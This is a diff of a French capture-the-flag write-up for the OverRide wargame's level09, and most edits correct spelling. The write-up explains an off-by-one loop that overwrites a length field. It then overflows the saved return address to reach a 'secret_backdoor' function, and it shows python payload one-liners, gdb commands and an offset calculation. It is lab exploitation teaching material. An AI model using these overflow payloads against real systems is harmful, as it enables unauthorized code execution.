@@ -16,26 +16,26 @@ level09@OverRide:~$ ./level09
 >: Msg sent!
 level09@OverRide:~$
 
-en decompilant avec https://dogbolt.org/?id=f1613b2e-2c3d-4b75-97e9-8137a7378884#Boomerang=8&Ghidra=503&Hex-Rays=202&angr=102&Relyze=1&RetDec=22&Snowman=8332&BinaryNinja=366
+en décompilant avec https://dogbolt.org/?id=f1613b2e-2c3d-4b75-97e9-8137a7378884#Boomerang=8&Ghidra=503&Hex-Rays=202&angr=102&Relyze=1&RetDec=22&Snowman=8332&BinaryNinja=366
 
-on voit tout de suite la fonction secret_backdoor qui nous permettra d'executer n'importe quel commande avec les droit de end 
+on voit tout de suite la fonction secret_backdoor qui nous permettra d'exécuter n'importe quelle commande avec les droits de end 
 
 avec la boucle for:
 
   for ( i = 0; i <= 40 && s[i] != 0; ++i )
     a1->username[i] = s[i];
 
-qui vas a 1 de trop a cause de i <= 40 au lieu de i < 40
+qui va à 1 de trop à cause de i <= 40 au lieu de i < 40
 
 on peut overwrite la variable suivante:
     char username[40];      // offset 140 (0x8C)
     int  max_msg_len;       // offset 180 (0xB4)
 
-et donc modifier max_msg_len car il font partie de la meme structure
+et donc modifier max_msg_len car ils font partie de la même structure
 
   data.max_msg_len = 140;
 
-mais il faut transformer le 140 en la plus grande valeur possible en 1octets
+mais il faut transformer le 140 en la plus grande valeur possible en 1 octet
 ff == 255 par exemple
 
 (python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)| ./level09
@@ -52,9 +52,9 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 Segmentation fault (core dumped)
 level09@OverRide:~$
 
-j'ai reussi a overide eip car on a un segfault
+j'ai réussi à overide eip car on a un segfault
 
-teston dans gdb 
+testons dans gdb 
 
 run < <(python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)
 
@@ -149,7 +149,7 @@ gs             0x0      0
 0x7fffffffe5c8 c'est rsp (esp en 32bits) et les 4 octets suivant sont les octets de saved eip
 
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-0x37674136 == offset 200 donc on sait qu'il y auras 200octets avant de pouvoir overide eip
+0x37674136 == offset 200 donc on sait qu'il y aura 200 octets avant de pouvoir overide eip
 
 (gdb) info functions secret_backdoor 
 All functions matching regular expression "secret_backdoor":
@@ -159,7 +159,7 @@ Non-debugging symbols:
 (gdb) 
 
 
-donc on fait un script qui vas dans le username fill de 40 octets de 'A' puis 'ff' pour overide la var max_msg_len puis dans le message fill de NOPS et l'addr de la secret backdoor 
+donc on fait un script qui va dans le username remplir 40 octets de 'A' puis 'ff' pour overide la var max_msg_len puis dans le message remplir de padding et l'addr de la secret backdoor 
 
 level09@OverRide:~$ (python /tmp/sc.py; cat) | ./level09
 --------------------------------------------
